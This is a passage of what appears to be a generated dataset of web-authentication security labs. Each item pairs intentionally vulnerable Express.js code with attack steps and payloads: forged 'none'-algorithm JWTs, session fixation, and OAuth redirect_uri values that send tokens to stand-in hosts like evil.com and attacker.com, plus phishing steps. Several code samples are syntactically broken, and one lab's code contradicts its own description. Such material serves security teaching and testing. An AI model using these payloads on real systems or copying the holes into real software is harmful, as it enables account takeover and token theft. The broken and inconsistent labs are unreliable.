    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'secret123', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\">Username: <input name=\"username\"/><br>Password: <input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.redirect('/account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: session=12345; path=/",
      "https://target-site.com/login?session=12345",
      "POST /login HTTP/1.1 with Cookie: session=12345"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass in authorization header",
    "Lab Description": "The application uses JWTs for user authentication but fails to validate the signing algorithm securely. It accepts tokens signed using the 'none' algorithm without verifying the signature. The application trusts any decoded payload blindly. To solve: craft a forged JWT that impersonates the admin user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite or Postman to capture a request with an Authorization: Bearer <token> header.",
      "2. Decode the JWT using jwt.io and note the algorithm used (likely HS256).",
      "3. Modify the header to {\"alg\":\"none\"} and the payload to {\"user\":\"admin\"}.",
      "4. Remove the signature part of the JWT and send the modified token in the Authorization header.",
      "5. Send a GET request to /admin and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use((req, res, next) => { const authHeader = req.headers.authorization; if (authHeader) { const token = authHeader.split(' ')[1]; try { const user = jwt.decode(token); req.user = user; } catch (e) { return res.status(403).send('Invalid token'); } } next(); }); app.get('/admin', (req, res) => { if (req.user && req.user.user === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer [spoofed_token]",
      "{\"alg\":\"none\"} + {\"user\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage in redirect URI handler",
    "Lab Description": "This application uses OAuth for authentication, but its redirect URI handler is improperly configured and does not validate the 'state' parameter. An attacker can perform an open redirect and intercept the access token. To solve: steal the OAuth token issued to Carlos and log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Register a malicious redirect URI on a phishing domain that you control.",
      "2. Craft an OAuth login link using the original client_id but with your redirect_uri and omit or manipulate the state parameter.",
      "3. Send the crafted link to the victim via email or chat.",
      "4. Once the victim logs in and consents, their token is leaked to your server through the redirect.",
      "5. Use the stolen token in a request to /profile and confirm access to Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); const CLIENT_ID = 'client123'; const REDIRECT_URI = 'http://localhost:4000/oauth/callback'; app.get('/login', (req, res) => { const authURL = `http://authserver.com/auth?response_type=token&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}`; res.redirect(authURL); }); app.get('/oauth/callback', (req, res) => { const accessToken = req.query.access_token; req.session = { token: accessToken }; res.send('Logged in'); }); app.get('/profile', (req, res) => { if (!req.session || !req.session.token) return res.status(403).send('Unauthorized'); request.get({ url: 'http://resource-server.com/userinfo', headers: { Authorization: `Bearer ${req.session.token}` } }, (err, resp, body) => { res.send(body); }); }); app.listen(4000);",
    "payloads": [
      "http://authserver.com/auth?client_id=client123&redirect_uri=https://evil.com/callback&response_type=token",
      "https://evil.com/callback#access_token=eyFakeToken123",
      "Authorization: Bearer eyFakeToken123"
    ]
  },
  {
    "Lab scenario": "JWT signature spoof via algorithm confusion in login API",
    "Lab Description": "The login endpoint accepts JWTs for authentication. The backend library fails to properly validate the 'alg' field, allowing an attacker to switch from a signed algorithm (e.g. HS256) to 'none'. The application trusts the JWT's payload without verifying its authenticity. To solve: Forge a JWT for user 'carlos' using the 'none' algorithm and access the My account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the login request using Burp Suite and capture the JWT from a valid login session.",
      "Send the token to Burp Decoder and decode the JWT structure to review its algorithm and payload.",
      "Manually change the algorithm from HS256 to none and set the payload to {\"username\":\"carlos\"}.",
      "Remove the JWT signature part entirely (keep only header and payload) and use the modified token in the Authorization header.",
      "Send a GET request to /my-account with the forged token and confirm unauthorized access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token); res.send(`Account details for ${payload.username}`); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session tokens in login redirect",
    "Lab Description": "The application initializes session tokens before login and fails to regenerate them after successful authentication. The token remains fixed across the login flow. To solve: Set a known session ID before login, then force a victim (Carlos) to authenticate, hijack their session, and access the My account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the initial GET /login request and note the Set-Cookie header value (session ID).",
      "Force this session ID using a crafted request or embed it in a link shared with Carlos (e.g., via email phishing).",
      "Wait for Carlos to authenticate using the fixed session ID, thus binding it to his session.",
      "Replay a request to /my-account using the hijacked session cookie.",
      "Verify successful unauthorized access to Carlos’s page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty123' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substr(2); sessions[sid] = { loggedIn: false }; res.setHeader('Set-Cookie', `sid=${sid}`); res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; const user = users.find(u => u.username === username && u.password === password); if (user && sessions[sid]) { sessions[sid].loggedIn = true; sessions[sid].username = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const session = sessions[sid]; if (session && session.loggedIn) { res.send(`Account details for ${session.username}`); } else { res.status(403).send('Not logged in'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Set-Cookie: sid=attackersession",
      "GET /login HTTP/1.1 with sid=attackersession",
      "GET /my-account HTTP/1.1 with sid=attackersession (after Carlos login)"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaks authorization code via Referer",
    "Lab Description": "The OAuth implementation leaks sensitive tokens through HTTP Referer headers. The app includes a third-party analytics script which causes unintentional leakage. To solve: Intercept the OAuth flow and extract Carlos’s authorization code from the Referer header when redirected to a malicious domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in to your account and observe the OAuth redirect flow with tools like Burp Suite or OWASP ZAP.",
      "Inject a malicious redirect_uri during the OAuth initiation phase pointing to your server.",
      "Send Carlos a crafted link to initiate OAuth with redirect_uri set to your controlled server.",
      "When Carlos logs in and authorizes the app, capture the HTTP Referer on your server, containing the authorization code.",
      "Exchange the code at the token endpoint to obtain access to Carlos’s protected resource and retrieve /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const tokens = {}; const users = { 'carlos': { email: 'carlos@example.com' } }; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code } = req.body; const user = authCodes[code]; if (user) { const token = Math.random().toString(36).substring(2); tokens[token] = user; res.json({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user) { res.send(`Account data for ${user}`); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running'));",
    "payloads": [
      "https://vulnerable.com/oauth/authorize?redirect_uri=https://attacker.com&client_id=abc",
      "Referer: https://attacker.com?code=stolen-code",
      "POST /token with code=stolen-code",
      "Authorization: Bearer <access_token>"
    ]
  },
  {
    "Lab scenario": "JWT secret key vulnerability in API authentication",
    "Lab Description": "The application's REST API uses JWTs for user authentication but fails to validate tokens securely. It uses a weak, guessable HMAC secret. The application trusts tokens even when re-signed with an attacker-supplied secret. To solve: Forge a valid admin JWT and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid JWT after logging in as a normal user",
      "Verify JWT algorithm using jwt.io and identify usage of 'HS256' with weak signature",
      "Attempt to brute-force the secret key using 'jwt-cracker' or 'jwt_tool'",
      "Forge a new JWT with payload {\"role\": \"admin\"} signed with the discovered key",
      "Use Postman to send a GET /admin request with the forged JWT in Authorization header"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = '123456'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.role === 'admin') { return res.send('Welcome admin!'); } else { return res.status(403).send('Not authorized'); } } catch (err) { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Auth Lab running'));",
    "payloads": [
      "header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }, payload: { \"user\": \"carlos\", \"role\": \"admin\" }, secret: '123456'",
      "Authorization: Bearer <forged_JWT_token_with_admin_role>"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application does not issue a new session ID upon successful login, allowing session fixation attacks. Attackers can pre-set session tokens and force victims to authenticate using them. To solve: Fixate a session for Carlos, then access his My account page while impersonating him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to generate a session token by visiting the login page",
      "Send a crafted phishing link to Carlos embedding your session ID in the cookie",
      "Wait for Carlos to authenticate using the fixated session ID",
      "Reuse the same session ID to access GET /my-account endpoint",
      "Verify Carlos's account data and capture the response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); app.use(express.urlencoded({ extended: true })); const users = { carlos: 'swordfish' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') { res.send('Sensitive data for Carlos'); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Set-Cookie: sessionID=attackerSessionID",
      "Session fixation via phishing: http://victim.site/login with pre-set sessionID",
      "Reuse sessionID after victim login to access /my-account"
    ]
  },
  {
    "Lab scenario": "OAuth redirect manipulation in third-party login",
    "Lab Description": "The application uses OAuth for third-party authentication but fails to validate redirect URIs properly. This allows attackers to manipulate the flow and steal authorization codes. To solve: Hijack the OAuth code and log in as Carlos by exchanging the stolen token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to inspect the OAuth redirect URL during normal login",
      "Observe that redirect_uri is not validated server-side",
      "Modify redirect_uri to point to attacker-controlled server",
      "Wait for Carlos to initiate login and intercept the authorization code",
      "Exchange the code using curl or Postman to obtain Carlos’s access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query; request.post('https://oauth.example.com/token', { form: { code, redirect_uri, client_id: 'abc', client_secret: 'xyz', grant_type: 'authorization_code' } }, (err, _, body) => { const token = JSON.parse(body).access_token; if (token) res.send('Logged in as: ' + token); else res.send('Auth failed'); }); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "redirect_uri=https://attacker.com/capture",
      "POST https://oauth.example.com/token with intercepted code and attacker redirect_uri",
      "Access-token: Bearer <token-for-carlos>"
    ]
  },
  {
    "Lab scenario": "JWT signature spoof via algorithm confusion",
    "Lab Description": "The application's authentication mechanism uses JWTs for session management. The backend accepts JWTs with the 'alg' header set to 'none', allowing attackers to forge tokens without a signature. The application trusts the contents of the JWT without verifying its signature when 'none' is used. To solve: Forge a JWT to impersonate Carlos and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture a request with a valid JWT after logging in.",
      "Send the token to Repeater and decode it using jwt.io or any JWT tool.",
      "Replace the 'alg' field in the header with 'none', and manually remove the signature.",
      "Change the payload to {\"username\":\"carlos\"} and re-encode the token.",
      "Set the modified token in the Authorization header and send the request to /my-account to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'mysecretkey'; const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username: user.username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{\"username\":\"carlos\"}."
    ]
  },
  {
    "Lab scenario": "Session fixation through predictable session ID",
    "Lab Description": "The login endpoint allows the attacker to specify a session ID in a cookie before logging in. The server reuses this session ID after authentication without regenerating it. This allows session fixation attacks. To solve: Set a session ID before Carlos logs in, then hijack his session using the fixed session token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a GET request to /login with a crafted session ID cookie using Postman or Burp Repeater.",
      "Forward the session cookie to Carlos via phishing or social engineering simulation.",
      "Wait for Carlos to log in using the fixed session ID.",
      "Use Burp to resend a request with the same session ID and access /my-account.",
      "Verify access to Carlos’s account page using the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Login failed'); const sid = req.cookies.session || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('session', sid); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') return res.send('Carlos account page'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Cookie: session=attackersession123",
      "Set session=attackersession123 before victim login",
      "Access /my-account with same cookie after victim logs in"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect exploit",
    "Lab Description": "The application integrates OAuth for user login using a third-party provider. However, the OAuth flow includes an open redirect flaw that allows attackers to hijack authorization codes. The redirect_uri parameter is not properly validated, enabling token leakage. To solve: Hijack Carlos's OAuth login to obtain a valid access token and log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start OAuth flow and intercept the request to the authorization endpoint using Burp.",
      "Modify the redirect_uri to a controlled domain that reflects query parameters (e.g., http://evil.com/callback).",
      "Send a phishing link to Carlos with the crafted redirect_uri.",
      "Capture the leaked authorization code on the attacker's server.",
      "Exchange the stolen code at the token endpoint and use the access_token to call /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query; request.post('https://oauth.provider.com/token', { form: { code, redirect_uri, client_id: 'client123', client_secret: 'secret456', grant_type: 'authorization_code' }}, (err, r, body) => { const token = JSON.parse(body).access_token; if (token) res.redirect(`${redirect_uri}?access_token=${token}`); else res.status(401).send('Token exchange failed'); }); }); app.get('/my-account', (req, res) => { const token = req.query.access_token; if (token === 'token-for-carlos') res.send('Carlos OAuth account'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable.com/auth/callback?redirect_uri=http://evil.com/callback",
      "Intercepted code=abc123 from evil.com/callback?code=abc123",
      "POST to token endpoint with stolen code",
      "access_token=token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "The session management system issues session IDs before user authentication, but fails to rotate them upon successful login. This opens the door to session fixation attacks. The application allows setting the session cookie manually and does not regenerate a new session ID post-login. To solve: fixate a session for Carlos before he logs in, then hijack it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET request to /login page and observe the Set-Cookie header with session ID.",
      "Send the session ID to Burp Repeater and preserve it manually.",
      "Initiate login as 'carlos' using a separate browser or Postman while forcing the reused session cookie.",
      "Confirm that session ID was not regenerated after login by observing session cookie value post-authentication.",
      "Replay a GET /account request using the fixed session ID to gain access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.use((req, res, next) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substring(2); res.cookie('session', sid); sessions[sid] = {}; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.session; sessions[sid].user = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]?.user; if (user) { res.send(`Account page for ${user}`); } else { res.status(403).send('Not authenticated'); } }); app.listen(3000);",
    "payloads": [
      "Inject known session ID via Cookie header: Cookie: session=fixedid123",
      "Login as Carlos in another tab using fixedid123",
      "Reuse fixedid123 to access /account as Carlos"
    ]
  },
  {
    "Lab scenario": "JWT token algorithm manipulation",
    "Lab Description": "This lab uses JWTs for user sessions but fails to properly validate the signing algorithm. The application uses a 'none' algorithm without enforcing server-side signature verification. To solve: forge a valid JWT with 'alg' set to 'none' and impersonate the admin user to access their account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman or Burp to capture the JWT token after logging in as a low-privilege user.",
      "Decode the token using jwt.io and note the structure and claims.",
      "Craft a new token manually with 'alg' set to 'none' and payload: { \"username\": \"admin\" }.",
      "Remove the signature section and send the token in the Authorization header.",
      "Send GET /admin-account with forged JWT and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'rootpass' }, { username: 'user', password: 'userpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'supersecret', { algorithm: 'none' }); res.json({ token }); } else { res.status(403).json({ message: 'Invalid credentials' }); } }); app.get('/admin-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token); if (decoded?.username === 'admin') { res.send('Admin panel access granted'); } else { res.status(401).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "JWT with alg: 'none' and payload: { \"username\": \"admin\" }",
      "Base64 encoded header: eyJhbGciOiJub25lIn0=",
      "Base64 encoded payload: eyJ1c2VybmFtZSI6ImFkbWluIn0=",
      "JWT: eyJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect flow",
    "Lab Description": "This OAuth implementation allows redirection to arbitrary URLs after authentication due to missing state parameter validation. The 'redirect_uri' can be manipulated, enabling token theft via phishing. To solve: craft a malicious OAuth URL to intercept Carlos's token and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp and intercept a login request using OAuth to identify the authorization flow URL and parameters.",
      "Modify the 'redirect_uri' parameter to point to your controlled server (e.g., http://attacker.net/callback).",
      "Send the modified URL to the victim or simulate a redirect using curl/Postman.",
      "Capture the redirected URL with the access token in your server logs.",
      "Use the stolen token in an Authorization header to access /user-profile as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'token-for-carlos'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/user-profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') { res.send('Profile of Carlos'); } else { res.status(401).send('Invalid token'); } }); app.listen(5000);",
    "payloads": [
      "GET /auth?redirect_uri=http://attacker.net/callback",
      "Intercepted access_token from attacker.net/callback",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT signature spoof via 'none' algorithm",
    "Lab Description": "This lab implements JSON Web Token (JWT) based authentication using insecure algorithm handling. The server accepts tokens signed using the 'none' algorithm, allowing attackers to forge valid tokens without knowing the secret key. The application verifies the JWT token from the Authorization header and grants access to sensitive resources without verifying the signature when 'alg' is set to 'none'. To solve: Craft a forged JWT for Carlos's account and access his profile page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a request using Burp Suite and inspect the Authorization: Bearer <token> header.",
      "Decode the JWT using jwt.io or Burp Decoder and verify the structure and algorithm.",
      "Create a new JWT header with \"alg\":\"none\" and set the payload to {\"username\":\"carlos\"}. Remove the signature part.",
      "Replace the original token in the Authorization header with the unsigned token and forward the request.",
      "Verify access to Carlos's profile page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', role: 'user' }]; app.get('/profile', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'carlos') return res.send('Sensitive profile data for carlos'); } jwt.verify(token, 'supersecret'); res.send('Valid token'); } catch (err) { res.status(403).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(JWT None Bypass Lab running on http://localhost:${PORT}));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "This lab is vulnerable to session fixation due to predictable session ID issuance. The application assigns session IDs before login and does not regenerate them after successful authentication. The attacker can pre-define a session ID and trick the victim into using it. To solve: Fix a session ID before Carlos logs in and use it to hijack his session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a request and note the Set-Cookie: session=... value before login.",
      "Send a crafted link to Carlos that contains a known session ID as a cookie value.",
      "Wait until Carlos logs in and reuses the known session ID.",
      "Send a GET /my-account request using the same session ID as the cookie.",
      "Confirm that Carlos’s account page is returned."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'securepass' }; const sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username] === password) { const sessionId = req.cookies.session; sessions[sessionId] = username; res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session; const user = sessions[sessionId]; if (user === 'carlos') { res.send('Welcome to carlos's account'); } else { res.status(403).send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
    "payloads": [
      "Cookie: session=known-session-id",
      "GET /login?username=carlos&password=securepass HTTP/1.1",
      "GET /my-account HTTP/1.1 with Cookie: session=known-session-id"
    ]
  },
  {
    "Lab scenario": "OAuth authorization code reuse",
    "Lab Description": "This lab’s OAuth implementation allows reuse of authorization codes, violating the single-use principle. An attacker who intercepts an unused authorization code can reuse it to log in as the victim. The app fails to invalidate codes after the first use. To solve: Capture Carlos's OAuth code and reuse it to gain access to his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp to proxy the OAuth flow and intercept the GET /oauth-callback?code=... request from Carlos.",
      "Save the captured code and allow Carlos’s original request to proceed.",
      "Send a new GET /oauth-callback?code=... request manually using the same code.",
      "Observe that a session is created and the user is authenticated as Carlos.",
      "Navigate to /my-account to verify the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const usedCodes = {}; const users = { 'authcode-carlos': 'carlos' }; app.get('/oauth-callback', (req, res) => { const { code } = req.query; if (usedCodes[code]) { return res.status(403).send('Code already used'); } const user = users[code]; if (user) { usedCodes[code] = true; res.cookie('session', user); res.send('Logged in as ' + user); } else { res.status(401).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log(OAuth Code Reuse Lab running on http://localhost:${PORT}));",
    "payloads": [
      "GET /oauth-callback?code=authcode-carlos HTTP/1.1",
      "Cookie: session=carlos",
      "GET /my-account HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "JWT tampering with none algorithm",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, it accepts tokens signed using the 'none' algorithm without verification. The application decodes the token and grants access based on the embedded user role. To solve: Forge a JWT granting admin privileges and access the /admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept JWT after login using Burp Suite and decode it using jwt.io.",
      "Observe the algorithm is set to 'HS256'. Change it to 'none' and remove the signature.",
      "Modify the payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
      "Encode the modified header and payload without a signature.",
      "Use Postman to send a request with the tampered JWT in the Authorization header and verify access to /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Access Denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{\"username\":\"admin\",\"role\":\"admin\"}.",
      "Authorization: Bearer <modified_jwt>"
    ]
  },
  {
    "Lab scenario": "Session fixation through predictable session ID",
    "Lab Description": "The application sets session identifiers in the URL as query parameters after login. These session IDs are generated using predictable patterns. An attacker can fix a session ID for the victim and hijack the session post-login. To solve: Pre-set Carlos's session ID, trick him into logging in, then reuse the session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to crawl and identify that sessionID is passed in the URL (e.g., /dashboard?sessionID=12345).",
      "Send a crafted link with sessionID=abc123 to Carlos via social engineering.",
      "Once Carlos logs in, his session is bound to sessionID=abc123.",
      "Use the same session ID to access /dashboard?sessionID=abc123 from your browser.",
      "Confirm account access and view Carlos’s dashboard page."
    ],
    "Vulnerability name": "Authentication",
